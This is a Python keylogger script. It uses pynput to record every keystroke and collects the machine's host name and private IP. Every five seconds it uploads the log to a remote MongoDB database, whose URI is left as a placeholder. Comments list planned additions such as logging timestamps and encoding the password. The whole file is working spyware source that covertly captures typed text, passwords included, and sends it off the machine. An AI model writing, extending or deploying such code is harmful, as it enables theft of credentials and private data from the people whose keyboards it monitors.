import pynput
from pynput.keyboard import Key, Listener
from pymongo import MongoClient
import logging
import socket
import ipgetter2
import threading
import datetime

#Wishlist:
#Starting time of log
#Ip of log
#Timeout when to store keys
#Encode password

uri = "placeholder"

keys_typed = ""
log = ""

try:
	client = MongoClient(uri,
    	connectTimeoutMS=30000,
        socketTimeoutMS=None)
	print("Connection successful")
	print()
except:
	print("Connection unsuccessful")

print(client)
print()

db = client["Logged_Keys"]
keys = db["keys"]

print("connected")
print()

def set_time_to_store_data(function_to_execute, seconds_till_timout):
    def function_wrapper():
        set_time_to_store_data(function_to_execute, seconds_till_timout)
        function_to_execute()

    timer = threading.Timer(seconds_till_timout, function_wrapper)
    timer.start()
    return timer

def store_in_database() :
	global log 
	global keys_typed

	log += keys_typed

	try:
		keys.insert_one({ "Keylog" : log })
		log = ""
		keys_typed = ""
		print("Successful insert")
	except:
		print("Something went wrong")

def writeText(host_name, host_ip):
    global log
    log += ("Hostname: " + host_name + "\n")
    log += ("Private IP: " + host_ip + "\n")

def get_host_name_IP(): 
    global external_ip
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name)
        
        print("Hostname:", host_name) 
        print("Private IP:", host_ip)
        writeText(host_name, host_ip)
    except: 
        external_ip = "N/A"
        print("Unable to get Hostname and IP")
        writeText(host_name, host_ip)

def start_logging():
	get_host_name_IP()
	timer = set_time_to_store_data(store_in_database, 5)

start_logging()

def on_key_press(key):
	global keys_typed

	keyString = str(key).replace("'","")

	if(keyString == "Key.space"):
		keys_typed += " "
		print(" ", end="", flush=True)
	elif(keyString == "Key.shift"):
		pass
	# elif(keyString == "x"):
	# 	#GET RID OF THIS 
	# 	#
	# 	#
	# 	#
	# 	store_in_database(keys_typed)
	# 	#
	else:
		print("{0}".format(keyString), end="", flush=True)
		keys_typed += keyString

def on_key_release(key):
	pass
	#print("{0} was realeased".format(key))

with Listener(on_press=on_key_press, on_release=on_key_release) as keyListener :
	keyListener.join()






















